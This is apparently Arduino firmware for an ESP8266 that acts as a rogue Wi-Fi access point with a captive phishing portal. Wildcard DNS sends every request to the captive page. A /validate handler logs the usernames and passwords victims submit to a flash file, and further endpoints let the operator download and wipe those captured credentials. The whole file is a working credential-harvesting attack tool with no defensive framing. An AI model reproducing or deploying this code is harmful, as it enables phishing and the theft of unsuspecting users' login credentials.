#include <Arduino.h>
#include <ArduinoJson.h>
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>
#include "FS.h"
#include "WebHTML.h"
#include "Config.h"

DNSServer dnsServer;
ESP8266WebServer webServer(80);

void loadConfig(Config &config) {

  File file = LittleFS.open("/config.txt", "r");
  StaticJsonDocument<512> doc;

  DeserializationError error = deserializeJson(doc, file);
  if (error)
    Serial.println(F("Failed to read file, using default configuration"));

  strlcpy(config.ssid,
          doc["ssid"] | "eXploit" ,
          sizeof(config.ssid));

  strlcpy(config.pass,
          doc["pass"] | "securenet" ,
          sizeof(config.pass));

  strlcpy(config.p_user,
          doc["p_user"] | "exploit" ,
          sizeof(config.p_user));

  strlcpy(config.p_pass,
          doc["p_pass"] | "exploit" ,
          sizeof(config.p_pass));
  config.number = doc["number"] | 18;
  file.close();
}

void saveConfig(const Config &config) {

  LittleFS.remove("/config.txt");
  File file = LittleFS.open("/config.txt", "w");

  if (!file) {
    Serial.println(F("Failed to create file"));
    return;
  }
  StaticJsonDocument<512> doc;
  doc["ssid"] = config.ssid;
  doc["pass"] = config.pass;
  doc["p_user"] = config.p_user;
  doc["p_pass"] = config.p_pass;
  doc["number"] = config.number;
  if (serializeJson(doc, file) == 0) {
    Serial.println(F("Failed to write to file"));
  }

  file.close();
}

void exploitCaptive() {
  webServer.send(200, "text/html", eXploit_Captive);
}

void exploitRestart() {
  webServer.send(200, "text/html", eXploit_Restart);
}

void exploitConfig() {
  if (!webServer.authenticate(config.p_user, config.p_pass))
    return webServer.requestAuthentication();
  webServer.send(200, "text/html", eXploit_Config);
}

void setup() {
  Serial.begin(115200);
  Serial.println("");
  Serial.println("Mount LittleFS");
  if (!LittleFS.begin()) {
    Serial.println("LittleFS mount failed");
    return;
  }
  Serial.println(F("Loading configuration..."));
  loadConfig(config);
  Serial.print("Configuring access point...");
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(config.ssid, config.pass);
  dnsServer.start(DNS_PORT, "*", apIP);

  pinMode(16, OUTPUT);
  pinMode(2, OUTPUT);
  digitalWrite(16, HIGH);
  digitalWrite(2, LOW);

  webServer.onNotFound([]()
  {
    exploitCaptive();
  });

  webServer.begin();

  webServer.on("/", exploitConfig);

  webServer.on("/saveConfig", []()
  {
    LittleFS.remove("/config.txt");
    File file = LittleFS.open("/config.txt", "w");

    if (!file) {
      Serial.println(F("Failed to create file"));
      return;
    }

    StaticJsonDocument<512> doc;

    doc["ssid"] = webServer.arg("ssid");
    doc["pass"] = webServer.arg("pass");
    doc["p_user"] = webServer.arg("p_user");
    doc["p_pass"] = webServer.arg("p_pass");

    if (serializeJson(doc, file) == 0) {
      Serial.println(F("Failed to write to file"));
    }
    file.close();
    Serial.println("Save config finished");

    webServer.send(200, "text/html", eXploit_Config); //////////////////////////////
  });

  webServer.on("/validate", []() {
    File file = LittleFS.open("/credentials.txt", "a");
    if (!file) {
      Serial.println("Failed to write credentials");
    }
    if (file.print("\nUsername : " + webServer.arg("user"))) {
      Serial.println("Username Written");
      digitalWrite(16, LOW);
      digitalWrite(2, HIGH);
    }
    else {
      Serial.println("\nUsername write failed");
    }
    if (file.print("\nPassword : " + webServer.arg("pass"))) {
      Serial.println("Password Written");
    }
    else {
      Serial.println("Password write failed");
    }
    delay(2000);
    file.close();
    webServer.send(200, "text/html", eXploit_Captive); //////////////////////////
  });

  webServer.on("/credentials", []() {
    File download = LittleFS.open("/credentials.txt", "r");
    if (!download) {
      Serial.println("Failed to read credentials file");
      webServer.send(200, "text/html", eXploit_Config);
    }
    if (download)
    {
      webServer.sendHeader("Content-Type", "text/text");
      webServer.sendHeader("Content-Disposition", "attachment; filename=credentials.txt");
      webServer.sendHeader("Connection", "close");
      webServer.streamFile(download, "application/octet-stream");
      download.close();
    }
  });

  webServer.on("/clear_cred", []() {
    
    File data = LittleFS.open("/credentials.txt", "r");
    if (!data) {
      Serial.println("Failed to read credentials file");
      webServer.send(200, "text/html", eXploit_Config);
    }
    if (data)
    {
      if (LittleFS.remove("/credentials.txt")) {
        Serial.println(F("File deleted successfully"));
      }
    }
    webServer.send(200, "text/html", eXploit_Config);
  });

  webServer.on("/reboot", []() {
    Serial.println("Esp going to reboot");
    exploitRestart();
    delay(1000);
    ESP.restart();
  });

  webServer.on("/test", []() {
    String button_val = "hello";
    button_val = list_Credentials + button_val;
    webServer.send(200, "text/html", button_val);
  });
}

void loop() {
  webServer.handleClient();
  dnsServer.processNextRequest();
}
